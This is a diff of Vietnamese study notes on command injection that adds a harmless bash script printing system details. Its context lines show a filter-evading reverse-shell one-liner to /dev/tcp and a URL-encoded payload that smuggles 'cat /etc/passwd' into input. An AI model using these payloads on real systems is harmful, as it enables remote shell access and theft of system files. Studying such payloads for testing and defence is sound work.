@@ -275,8 +275,28 @@ ba$@sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
 ```sh
 something%0Acat%20/etc/passwd
 ```
+## 4. Viết 1 file bash
 
-## 4. Tham khảo:
+```bash
+#!/bin/bash
+menu=(
+"Ten may: `cat /etc/os-release | grep -w "NAME"|cut -d '=' -f2`"
+"Ban phan phoi: `cat /etc/os-release | grep -w "VERSION"|cut -d '=' -f2`"
+"He dieu hanh: `cat /proc/version |cut -d '=' -f2`"
+"Ten CPU: `cat /proc/cpuinfo | grep -w "model name" |cut -d ':' -f2`"
+"Bit CPU: `lscpu | grep -w "CPU op-mode(s)" | cut -d ':' -f2`"
+"Toc do CPU `lscpu | grep -w "CPU MHz"|cut -d ':' -f2` Mhz"
+"Dung luong o cung: `df -h /dev/sda1 --output=size|grep "G"`" 
+"Dung luong con lai: `df -h /dev/sda1 --output=avail|grep "G"`"
+"Dia chi ip: `ip addr |grep -w "inet"|cut -d '/' -f2 | tr -s ' '|cut -d ' ' -f3`"
+)
+
+for ((i=0;i<${#menu[@]};i++))
+do
+    echo -e ${menu[i]} 
+done
+```
+## 5. Tham khảo:
 
 * https://github.com/swisskyrepo/PayloadsAllTheThings
 
